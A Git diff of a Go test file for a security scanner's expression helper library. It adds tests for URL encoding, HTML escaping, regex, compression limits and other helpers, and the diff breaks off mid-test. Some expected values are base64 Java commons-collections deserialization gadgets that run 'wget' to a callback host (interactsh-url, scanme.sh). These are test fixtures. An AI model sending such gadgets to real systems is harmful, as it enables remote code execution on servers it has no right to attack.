@@ -23,13 +23,150 @@ func TestIndex(t *testing.T) {
 }
 
 func TestDSLURLEncodeDecode(t *testing.T) {
-	encoded, err := DefaultHelperFunctions["url_encode"]("&test\"")
-	require.Nil(t, err, "could not url encode")
-	require.Equal(t, "%26test%22", encoded, "could not get url encoded data")
+	t.Run("Standard encoding (default mode)", func(t *testing.T) {
+		testCases := []struct {
+			name     string
+			input    string
+			expected string
+		}{
+			{
+				name:     "basic ascii",
+				input:    "Hello World",
+				expected: "Hello%20World",
+			},
+			{
+				name:     "special characters",
+				input:    "!@#$%^&*()_+",
+				expected: "!%40%23%24%25%5E%26*()_%2B",
+			},
+			{
+				name:     "query string characters",
+				input:    "key=value&other=value?param=test",
+				expected: "key%3Dvalue%26other%3Dvalue%3Fparam%3Dtest",
+			},
+			{
+				name:     "path characters",
+				input:    "/path/to/resource/",
+				expected: "%2Fpath%2Fto%2Fresource%2F",
+			},
+			{
+				name:     "unicode characters",
+				input:    "こんにちは世界",
+				expected: "%E3%81%93%E3%82%93%E3%81%AB%E3%81%A1%E3%81%AF%E4%B8%96%E7%95%8C",
+			},
+			{
+				name:     "emoji",
+				input:    "🚀✨",
+				expected: "%F0%9F%9A%80%E2%9C%A8",
+			},
+			{
+				name:     "reserved characters that should be encoded",
+				input:    ";,/?:@&=+$#",
+				expected: "%3B%2C%2F%3F%3A%40%26%3D%2B%24%23",
+			},
+			{
+				name:     "unreserved characters that should not be encoded",
+				input:    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_.!~*'()",
+				expected: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_.!~*'()",
+			},
+			{
+				name:     "whitespace characters",
+				input:    " \t\n\r",
+				expected: "%20%09%0A%0D",
+			},
+			{
+				name:     "std library encoding",
+				input:    "&test\"",
+				expected: "%26test%22",
+			},
+		}
 
-	decoded, err := DefaultHelperFunctions["url_decode"]("%26test%22")
-	require.Nil(t, err, "could not url encode")
-	require.Equal(t, "&test\"", decoded, "could not get url decoded data")
+		for _, tc := range testCases {
+			t.Run(tc.name, func(t *testing.T) {
+				encoded, err := DefaultHelperFunctions["url_encode"](tc.input)
+				require.NoError(t, err, "url_encode should not error")
+				require.Equal(t, tc.expected, encoded, "url_encode (standard mode) output should match expected")
+
+				encoded, err = DefaultHelperFunctions["url_encode"](tc.input, false)
+				require.NoError(t, err, "url_encode should not error with explicit false")
+				require.Equal(t, tc.expected, encoded, "url_encode with explicit false should match expected")
+
+				decoded, err := DefaultHelperFunctions["url_decode"](encoded)
+				require.NoError(t, err, "url_decode should not error")
+				require.Equal(t, tc.input, decoded, "url_decode should reverse url_encode")
+			})
+		}
+	})
+
+	t.Run("Encode all special characters (CyberChef mode)", func(t *testing.T) {
+		testCases := []struct {
+			name     string
+			input    string
+			expected string
+		}{
+			{
+				name:     "basic ascii",
+				input:    "Hello World",
+				expected: "Hello%20World",
+			},
+			{
+				name:     "special characters",
+				input:    "!@#$%^&*()_+",
+				expected: "%21%40%23%24%25%5E%26%2A%28%29%5F%2B",
+			},
+			{
+				name:     "query string characters",
+				input:    "key=value&other=value?param=test",
+				expected: "key%3Dvalue%26other%3Dvalue%3Fparam%3Dtest",
+			},
+			{
+				name:     "path characters",
+				input:    "/path/to/resource/",
+				expected: "%2Fpath%2Fto%2Fresource%2F",
+			},
+			{
+				name:     "unicode characters",
+				input:    "こんにちは世界",
+				expected: "%E3%81%93%E3%82%93%E3%81%AB%E3%81%A1%E3%81%AF%E4%B8%96%E7%95%8C",
+			},
+			{
+				name:     "emoji",
+				input:    "🚀✨",
+				expected: "%F0%9F%9A%80%E2%9C%A8",
+			},
+			{
+				name:     "reserved characters that should be encoded",
+				input:    ";,/?:@&=+$#",
+				expected: "%3B%2C%2F%3F%3A%40%26%3D%2B%24%23",
+			},
+			{
+				name:     "all special characters encoded",
+				input:    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_.!~*'()",
+				expected: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789%2D%5F%2E%21%7E%2A%27%28%29",
+			},
+			{
+				name:     "whitespace characters",
+				input:    " \t\n\r",
+				expected: "%20%09%0A%0D",
+			},
+		}
+
+		for _, tc := range testCases {
+			t.Run(tc.name, func(t *testing.T) {
+				encoded, err := DefaultHelperFunctions["url_encode"](tc.input, true)
+				require.NoError(t, err, "url_encode should not error with boolean true")
+				require.Equal(t, tc.expected, encoded, "url_encode (encode all mode) output should match expected")
+
+				encoded, err = DefaultHelperFunctions["url_encode"](tc.input, 1)
+				require.NoError(t, err, "url_encode should not error with numeric 1")
+				require.Equal(t, tc.expected, encoded, "url_encode with numeric 1 should match expected")
+
+				decoded, err := DefaultHelperFunctions["url_decode"](encoded)
+				require.NoError(t, err, "url_decode should not error")
+				require.Equal(t, tc.input, decoded, "url_decode should reverse url_encode")
+			})
+		}
+	})
 }
 
 func TestDSLTimeComparison(t *testing.T) {
@@ -110,24 +247,26 @@ func TestGetPrintableDslFunctionSignatures(t *testing.T) {
 	contains(arg1, arg2 interface{}) interface{}
 	contains_all(body interface{}, substrs ...string) bool
 	contains_any(body interface{}, substrs ...string) bool
+	cookie_unsign(s string) string
 	count(str, substr string) int
 	date_time(dateTimeFormat string, optionalUnixTime interface{}) string
 	dec_to_hex(arg1 interface{}) interface{}
 	deflate(arg1 interface{}) interface{}
 	ends_with(str string, suffix ...string) bool
-	equals_any(arg1, arg2 interface{}) interface{}
+	equals_any(s interface{}, subs ...interface{}) bool
 	generate_java_gadget(arg1, arg2, arg3 interface{}) interface{}
 	generate_jwt(jsonString, algorithm, optionalSignature string, optionalMaxAgeUnix interface{}) string
 	gzip(arg1 interface{}) interface{}
-	gzip_decode(arg1 interface{}) interface{}
+	gzip_decode(data string, optionalReadLimit int) string
+	gzip_mtime(arg1 interface{}) interface{}
 	hex_decode(arg1 interface{}) interface{}
 	hex_encode(arg1 interface{}) interface{}
 	hex_to_dec(arg1 interface{}) interface{}
 	hmac(arg1, arg2, arg3 interface{}) interface{}
-	html_escape(arg1 interface{}) interface{}
+	html_escape(s string, optionalConvertAllChars bool) string
 	html_unescape(arg1 interface{}) interface{}
 	index(arg1, arg2 interface{}) interface{}
-	inflate(arg1 interface{}) interface{}
+	inflate(data string, optionalReadLimit int) string
 	ip_format(arg1, arg2 interface{}) interface{}
 	jarm(arg1 interface{}) interface{}
 	join(separator string, elements ...interface{}) string
@@ -152,13 +291,14 @@ func TestGetPrintableDslFunctionSignatures(t *testing.T) {
 	rand_text_alphanumeric(length uint, optionalBadChars string) string
 	rand_text_numeric(length uint, optionalBadNumbers string) string
 	regex(arg1, arg2 interface{}) interface{}
-	regex_all(arg1, arg2 interface{}) interface{}
-	regex_any(arg1, arg2 interface{}) interface{}
+	regex_all(pattern string, inputs ...string) bool
+	regex_any(pattern string, inputs ...string) bool
 	remove_bad_chars(arg1, arg2 interface{}) interface{}
 	repeat(arg1, arg2 interface{}) interface{}
 	replace(arg1, arg2, arg3 interface{}) interface{}
 	replace_regex(arg1, arg2, arg3 interface{}) interface{}
 	reverse(arg1 interface{}) interface{}
+	rsa_encrypt(arg1, arg2 interface{}) interface{}
 	sha1(arg1 interface{}) interface{}
 	sha256(arg1 interface{}) interface{}
 	sha512(arg1 interface{}) interface{}
@@ -169,6 +309,7 @@ func TestGetPrintableDslFunctionSignatures(t *testing.T) {
 	split(input string, separator string, optionalChunkSize) []string
 	starts_with(str string, prefix ...string) bool
 	substr(str string, start int, optionalEnd int)
+	to_bool(arg1 interface{}) interface{}
 	to_lower(arg1 interface{}) interface{}
 	to_number(arg1 interface{}) interface{}
 	to_string(arg1 interface{}) interface{}
@@ -187,12 +328,12 @@ func TestGetPrintableDslFunctionSignatures(t *testing.T) {
 	unix_time(optionalSeconds uint) float64
 	unpack(arg1, arg2 interface{}) interface{}
 	url_decode(arg1 interface{}) interface{}
-	url_encode(arg1 interface{}) interface{}
+	url_encode(s string, optionalEncodeAllSpecialChars bool) string
 	wait_for(seconds uint)
 	xor(args ...interface{}) interface{}
 	zip(file_entry string, content string, ... ) []byte
 	zlib(arg1 interface{}) interface{}
-	zlib_decode(arg1 interface{}) interface{}
+	zlib_decode(data string, optionalReadLimit int) string
 `
 
 	signatures := GetPrintableDslFunctionSignatures(true)
@@ -209,32 +350,42 @@ func TestDslExpressions(t *testing.T) {
 		`base64(1234)`:                                   "MTIzNA==",
 		`base64_py("Hello")`:                             "SGVsbG8=\n",
 		`hex_encode("aa")`:                               "6161",
-		`html_escape("<body>test</body>")`:               "&lt;body&gt;test&lt;/body&gt;",
+		`html_escape("<body>test</body>")`:               "&lt;body&gt;test&lt;&sol;body&gt;",
+		`html_escape("<body>test</body>", true)`:         "&lt;&#98;&#111;&#100;&#121;&gt;&#116;&#101;&#115;&#116;&lt;&sol;&#98;&#111;&#100;&#121;&gt;",
 		`html_unescape("&lt;body&gt;test&lt;/body&gt;")`: "<body>test</body>",
-		`md5("Hello")`:                                   "8b1a9953c4611296a827abf8c47804d7",
-		`md5(1234)`:                                      "81dc9bdb52d04dc20036dbd8313ed055",
-		`mmh3("Hello")`:                                  "316307400",
-		`remove_bad_chars("abcd", "bc")`:                 "ad",
-		`replace("Hello", "He", "Ha")`:                   "Hallo",
-		`concat("Hello", 123, "world")`:                  "Hello123world",
-		`join("_", "Hello", 123, "world")`:               "Hello_123_world",
-		`repeat("a", 5)`:                                 "aaaaa",
-		`repeat("a", "5")`:                               "aaaaa",
-		`repeat("../", "5")`:                             "../../../../../",
-		`repeat(5, 5)`:                                   "55555",
-		`replace_regex("He123llo", "(\\d+)", "")`:        "Hello",
-		`reverse("abc")`:                                 "cba",
-		`sha1("Hello")`:                                  "f7ff9e8b7bb2e09b70935a5d785e0cc5d9d0abf0",
-		`sha256("Hello")`:                                "185f8db32271fe25f561a6fc938b2e264306ec304eda518007d1764826381969",
-		`sha512("Hello")`:                                "3615f80c9d293ed7402687f94b22d58e529b8cc7916f8fac7fddf7fbd5af4cf777d3d795a7a00a16bf7e7f3fb9561ee9baae480da9fe7a18769e71886b03f315",
-		`to_lower("HELLO")`:                              "hello",
-		`to_upper("hello")`:                              "HELLO",
-		`trim("aaaHelloddd", "ad")`:                      "Hello",
-		`trim_left("aaaHelloddd", "ad")`:                 "Helloddd",
-		`trim_prefix("aaHelloaa", "aa")`:                 "Helloaa",
-		`trim_right("aaaHelloddd", "ad")`:                "aaaHello",
-		`trim_space("  Hello  ")`:                        "Hello",
-		`trim_suffix("aaHelloaa", "aa")`:                 "aaHello",
+		`html_unescape("&lt;&#98;&#111;&#100;&#121;&gt;&#116;&#101;&#115;&#116;&lt;&sol;&#98;&#111;&#100;&#121;&gt;")`:            "<body>test</body>",
+		`html_unescape("&#x3c;&#x62;&#x6f;&#x64;&#x79;&#x3e;&#x74;&#x65;&#x73;&#x74;&#x3c;&#x2f;&#x62;&#x6f;&#x64;&#x79;&#x3e;")`: "<body>test</body>",
+		`md5("Hello")`:                            "8b1a9953c4611296a827abf8c47804d7",
+		`md5(1234)`:                               "81dc9bdb52d04dc20036dbd8313ed055",
+		`mmh3("Hello")`:                           "316307400",
+		`remove_bad_chars("abcd", "bc")`:          "ad",
+		`replace("Hello", "He", "Ha")`:            "Hallo",
+		`concat("Hello", 123, "world")`:           "Hello123world",
+		`join("_", "Hello", 123, "world")`:        "Hello_123_world",
+		`repeat("a", 5)`:                          "aaaaa",
+		`repeat("a", "5")`:                        "aaaaa",
+		`repeat("../", "5")`:                      "../../../../../",
+		`repeat(5, 5)`:                            "55555",
+		`replace_regex("He123llo", "(\\d+)", "")`: "Hello",
+		`reverse("abc")`:                          "cba",
+		`sha1("Hello")`:                           "f7ff9e8b7bb2e09b70935a5d785e0cc5d9d0abf0",
+		`sha256("Hello")`:                         "185f8db32271fe25f561a6fc938b2e264306ec304eda518007d1764826381969",
+		`sha512("Hello")`:                         "3615f80c9d293ed7402687f94b22d58e529b8cc7916f8fac7fddf7fbd5af4cf777d3d795a7a00a16bf7e7f3fb9561ee9baae480da9fe7a18769e71886b03f315",
+		`to_bool(1)`:                              true,
+		`to_bool("1")`:                            true,
+		`to_bool("true")`:                         true,
+		`to_bool("TrUe")`:                         false,
+		`to_bool("0")`:                            false,
+		`to_bool(0)`:                              false,
+		`to_bool("x")`:                            false,
+		`to_lower("HELLO")`:                       "hello",
+		`to_upper("hello")`:                       "HELLO",
+		`trim("aaaHelloddd", "ad")`:               "Hello",
+		`trim_left("aaaHelloddd", "ad")`:          "Helloddd",
+		`trim_prefix("aaHelloaa", "aa")`:          "Helloaa",
+		`trim_right("aaaHelloddd", "ad")`:         "aaaHello",
+		`trim_space("  Hello  ")`:                 "Hello",
+		`trim_suffix("aaHelloaa", "aa")`:          "aaHello",
 		`url_decode("https:%2F%2Fprojectdiscovery.io%3Ftest=1")`: "https://projectdiscovery.io?test=1",
 		`url_encode("https://projectdiscovery.io/test?a=1")`:     "https%3A%2F%2Fprojectdiscovery.io%2Ftest%3Fa%3D1",
 		`gzip("Hello")`:         "\x1f\x8b\b\x00\x00\x00\x00\x00\x00\xff\xf2H\xcd\xc9\xc9\a\x04\x00\x00\xff\xff\x82\x89\xd1\xf7\x05\x00\x00\x00",
@@ -244,9 +395,9 @@ func TestDslExpressions(t *testing.T) {
 		`deflate("Hello")`:                              "\xf2\x48\xcd\xc9\xc9\x07\x04\x00\x00\xff\xff",
 		`inflate(hex_decode("f348cdc9c90700"))`:         "Hello",
 		`inflate(hex_decode("f248cdc9c907040000ffff"))`: "Hello",
-		`gzip_decode(hex_decode("1f8b08000000000000fff248cdc9c907040000ffff8289d1f705000000"))`:       "Hello",
-		`generate_java_gadget("commons-collections3.1", "wget https://{{interactsh-url}}", "base64")`: "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAJmh0dHBzOi8vZ2l0aHViLmNvbS9qb2FvbWF0b3NmL2pleGJvc3Mgc3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNoYWluZWRUcmFuc2Zvcm1lcjDHl%2BwoepcEAgABWwANaVRyYW5zZm9ybWVyc3QALVtMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwdXIALVtMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLlRyYW5zZm9ybWVyO71WKvHYNBiZAgAAeHAAAAAFc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5Db25zdGFudFRyYW5zZm9ybWVyWHaQEUECsZQCAAFMAAlpQ29uc3RhbnRxAH4AA3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh%2Bj/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AGwAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB%2BABtzcQB%2BABN1cQB%2BABgAAAACcHVxAH4AGAAAAAB0AAZpbnZva2V1cQB%2BABsAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAYc3EAfgATdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQAH3dnZXQgaHR0cHM6Ly97e2ludGVyYWN0c2gtdXJsfX10AARleGVjdXEAfgAbAAAAAXEAfgAgc3EAfgAPc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAFzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAAdwgAAAAQAAAAAHh4eA==",
-		`generate_jwt("{\"name\":\"John Doe\",\"foo\":\"bar\"}", "HS256", "hello-world")`:             []byte("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmb28iOiJiYXIiLCJuYW1lIjoiSm9obiBEb2UifQ.EsrL8lIcYJR_Ns-JuhF3VCllCP7xwbpMCCfHin_WT6U"),
+		`gzip_decode(hex_decode("1f8b08000000000000fff248cdc9c907040000ffff8289d1f705000000"))`: "Hello",
+		`generate_java_gadget("commons-collections3.1", "wget http://scanme.sh", "base64")`:     "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAJmh0dHBzOi8vZ2l0aHViLmNvbS9qb2FvbWF0b3NmL2pleGJvc3Mgc3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNoYWluZWRUcmFuc2Zvcm1lcjDHl%2BwoepcEAgABWwANaVRyYW5zZm9ybWVyc3QALVtMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwdXIALVtMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLlRyYW5zZm9ybWVyO71WKvHYNBiZAgAAeHAAAAAFc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5Db25zdGFudFRyYW5zZm9ybWVyWHaQEUECsZQCAAFMAAlpQ29uc3RhbnRxAH4AA3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh%2Bj/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AGwAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB%2BABtzcQB%2BABN1cQB%2BABgAAAACcHVxAH4AGAAAAAB0AAZpbnZva2V1cQB%2BABsAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAYc3EAfgATdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQAFXdnZXQgaHR0cDovL3NjYW5tZS5zaHQABGV4ZWN1cQB%2BABsAAAABcQB%2BACBzcQB%2BAA9zcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHh4",
+		`generate_jwt("{\"name\":\"John Doe\",\"foo\":\"bar\"}", "HS256", "hello-world")`:       []byte("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmb28iOiJiYXIiLCJuYW1lIjoiSm9obiBEb2UifQ.EsrL8lIcYJR_Ns-JuhF3VCllCP7xwbpMCCfHin_WT6U"),
 		`base64_decode("SGVsbG8=")`:                               "Hello",
 		`hex_decode("6161")`:                                      "aa",
 		`len("Hello")`:                                            float64(5),
@@ -298,17 +449,34 @@ func TestDslExpressions(t *testing.T) {
 		`uniq("ab", "cd", "12", "34", "12", "cd")`:                []string{"ab", "cd", "12", "34"},
 		`join(" ", uniq("ab", "cd", "12", "34", "12", "cd"))`:     "ab cd 12 34",
 		`join(", ", split(hex_encode("abcdefg"), 2))`:             "61, 62, 63, 64, 65, 66, 67",
-		`json_minify("{  \"name\":  \"John Doe\",   \"foo\":  \"bar\"     }")`:     "{\"foo\":\"bar\",\"name\":\"John Doe\"}",
-		`json_prettify("{\"foo\":\"bar\",\"name\":\"John Doe\"}")`:                 "{\n    \"foo\": \"bar\",\n    \"name\": \"John Doe\"\n}",
-		`ip_format('127.0.0.1', '1')`:                                              "127.0.0.1",
-		`ip_format('127.0.0.1', '3')`:                                              "0177.0.0.01",
-		`ip_format('127.0.0.1', '5')`:                                              "2130706433",
-		`ip_format('127.0.1.0', '11')`:                                             "127.0.256",
-		"unpack('>I', '\xac\xd7\t\xd0')":                                           -272646673,
-		"xor('\x01\x02', '\x02\x01')":                                              []uint8([]byte{0x3, 0x3}),
-		`count("projectdiscovery", "e")`:                                           2,
-		`concat(to_title("pRoJeCt"), to_title("diScOvErY"))`:                       "ProjectDiscovery",
-		`concat(to_title("welcome "), "to", to_title(" watch"), to_title("mojo"))`: "Welcome to WatchMojo",
+		`json_minify("{  \"name\":  \"John Doe\",   \"foo\":  \"bar\"     }")`:                       "{\"foo\":\"bar\",\"name\":\"John Doe\"}",
+		`json_prettify("{\"foo\":\"bar\",\"name\":\"John Doe\"}")`:                                   "{\n    \"foo\": \"bar\",\n    \"name\": \"John Doe\"\n}",
+		`ip_format('127.0.0.1', '1')`:                                                                "127.0.0.1",
+		`ip_format('127.0.0.1', '3')`:                                                                "0177.0.0.01",
+		`ip_format('127.0.0.1', '5')`:                                                                "2130706433",
+		`ip_format('127.0.1.0', '11')`:                                                               "127.0.256",
+		"unpack('>I', '\xac\xd7\t\xd0')":                                                             -272646673,
+		"xor('\x01\x02', '\x02\x01')":                                                                []uint8([]byte{0x3, 0x3}),
+		`count("projectdiscovery", "e")`:                                                             2,
+		`concat(to_title("pRoJeCt"), to_title("diScOvErY"))`:                                         "ProjectDiscovery",
+		`concat(to_title("welcome "), "to", to_title(" watch"), to_title("mojo"))`:                   "Welcome to WatchMojo",
+		`zlib_decode(hex_decode("789cf248cdc9c907040000ffff058c01f5"), 4)`:                           "Hell",
+		`gzip_decode(hex_decode("1f8b08000000000000fff248cdc9c907040000ffff8289d1f705000000"), 4)`:   "Hell",
+		`gzip_mtime(hex_decode("1f8b08000000000000fff248cdc9c907040000ffff8289d1f705000000"))`:       float64(0),
+		`inflate(hex_decode("f248cdc9c907040000ffff"), 4)`:                                           "Hell",
+		`zlib_decode(hex_decode("789cf248cdc9c907040000ffff058c01f5"), 100)`:                         "Hello",
+		`gzip_decode(hex_decode("1f8b08000000000000fff248cdc9c907040000ffff8289d1f705000000"), 100)`: "Hello",
+		`inflate(hex_decode("f248cdc9c907040000ffff"), 100)`:                                         "Hello",
+		`rsa_encrypt("plaindata", "-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtKqKDIZyXltCyLVym+VL
+N4kMQHoazrJ7G5GbOSITuFaV0lpbXTw9VmW8wkyxG0U9b5zMaIfWyF5T9DWw/AcI
+9ehszNYTy1U6KgNN94bZzILsWnQ3M7o8T9qZxITNBd/90VpW2O0ClR1z+gB4ls1C
+cSy4ym0pQ7ZKMEJbWYxFuw3CJfWAFbdXcULgqIG0K7Nh++g6v5XLRceqxOW9j9Mc
+29THVYk8uvF8gEOZBvM4RnhJhJX03ACRCHqBg4CdKaYaWIWc+eOxZrBg0iAfWpy+
+vOZml6PnbXH+Z1+yVskAoyGKnOxRSaD0DJY6xq1x3z5AoVImLsCLSkJr2D+4W+EC
+PQIDAQAB
+-----END PUBLIC KEY-----") != ""`: true,
+		`cookie_unsign("gAJ9cQFYCgAAAHRlc3Rjb29raWVxAlgGAAAAd29ya2VkcQNzLg:1mgnkC:z5yDxzI06qYVAU3bkLaWYpADT4I")`: "changeme",
 	}
 
 	testDslExpressions(t, dslExpressions)
@@ -855,4 +1023,114 @@ func Test_Zlib_decompression_bomb(t *testing.T) {
 	require.NoError(t, err, "Error while evaluating the compiled %q expression", dslExpression)
 	// Cannot be greater than 10MB
 	require.LessOrEqual(t, int64(len(actualResult.(string))), DefaultMaxDecompressionSize, "The result is too large")
+}
+
+func TestRegexFunctions(t *testing.T) {
+	t.Run("regex", func(t *testing.T) {
+		tests := map[string]interface{}{
+			`regex("H([a-z]+)o", "Hello")`:                    true,
+			`regex("\\d+", "abc")`:                            false,
+			`regex("[a-z]+", "123")`:                          false,
+			`regex("^\\d+$", "123abc")`:                       false,
+			`regex("(?i)HELLO", "hello")`:                     true,
+			`regex("^$", "")`:                                 true,
+			`regex("\\s+", "nospaces")`:                       false,
+			`regex("\\s+", "has some spaces")`:                true,
+			`regex("^\\w+@\\w+\\.\\w+$", "test@example.com")`: true,
+		}
+		testDslExpressions(t, tests)
+	})
+
+	t.Run("regex_all", func(t *testing.T) {
+		tests := map[string]interface{}{
+			// Basic numeric tests
+			`regex_all("\\d+", "123", "456", "789")`: true,
+			`regex_all("\\d+", "123", "abc", "789")`: false,
+			`regex_all("\\d+", "abc", "def", "ghi")`: false,
+
+			// Pattern matching tests
+			`regex_all("[a-z]+", "abc", "def", "ghi")`:    true,
+			`regex_all("[A-Z]+", "ABC", "DEF", "GHI")`:    true,
+			`regex_all("^[a-z]$", "a", "b", "c")`:         true,
+			`regex_all("^\\w+$", "abc", "123", "abc123")`: true,
+
+			// Edge cases
+			`regex_all("^$", "", "", "")`:          true,
+			`regex_all(".*", "", "abc", "123")`:    true,
+			`regex_all("^\\s*$", " ", " ", " ")`:   true,
+			`regex_all("^\\s+$", "   ", " ", "	")`: true,
+
+			// Email pattern test
+			`regex_all("^\\w+@\\w+\\.\\w+$", "test@test.com", "admin@test.com")`: true,
+			`regex_all("^\\w+@\\w+\\.\\w+$", "test@test.com", "invalid")`:        false,
+
+			// Case sensitivity tests
+			`regex_all("(?i)test", "TEST", "Test", "test")`: true,
+			`regex_all("test", "TEST", "Test", "test")`:     false,
+		}
+		testDslExpressions(t, tests)
+	})
+
+	t.Run("regex_any", func(t *testing.T) {
+		tests := map[string]interface{}{
+			// Basic numeric tests
+			`regex_any("\\d+", "123", "abc", "789")`: true,
+			`regex_any("\\d+", "abc", "def", "ghi")`: false,
+			`regex_any("\\d+", "123", "456", "789")`: true,
+
+			// Pattern matching tests
+			`regex_any("[a-z]+", "ABC", "def", "GHI")`:    true,
+			`regex_any("[A-Z]+", "abc", "def", "GHI")`:    true,
+			`regex_any("^[a-z]$", "1", "b", "2")`:         true,
+			`regex_any("^\\w+$", "!!!", "@#$", "abc123")`: true,
+
+			// Edge cases
+			`regex_any("^$", "a", "b", "")`:          true,
+			`regex_any("^$", "a", "b", "c")`:         false,
+			`regex_any("^\\s+$", "abc", " ", "def")`: true,
+
+			// Email pattern test
+			`regex_any("^\\w+@\\w+\\.\\w+$", "invalid", "test@test.com")`: true,
+			`regex_any("^\\w+@\\w+\\.\\w+$", "invalid1", "invalid2")`:     false,
+
+			// Case sensitivity tests
+			`regex_any("(?i)test", "ABC", "Test", "xyz")`: true,
+			`regex_any("test", "TEST", "TEST", "TEST")`:   false,
+		}
+		testDslExpressions(t, tests)
+	})
+}
+
+func TestEqualAnyFunction(t *testing.T) {
+	t.Run("equals_any", func(t *testing.T) {
+		tests := map[string]interface{}{
+			// Basic string matching tests
+			`equals_any("test", "test", "foo", "bar")`: true,
+			`equals_any("foo", "test", "bar", "baz")`:  false,
+			`equals_any("hello", "hello", "world")`:    true,
+			`equals_any("world", "hello", "world")`:    true,
+			`equals_any("none", "hello", "world")`:     false,
+
+			// Empty string tests
+			`equals_any("", "", "test")`:     true,
+			`equals_any("test", "", "test")`: true,
+			`equals_any("", "test", "foo")`:  false,
+
+			// Case sensitivity tests
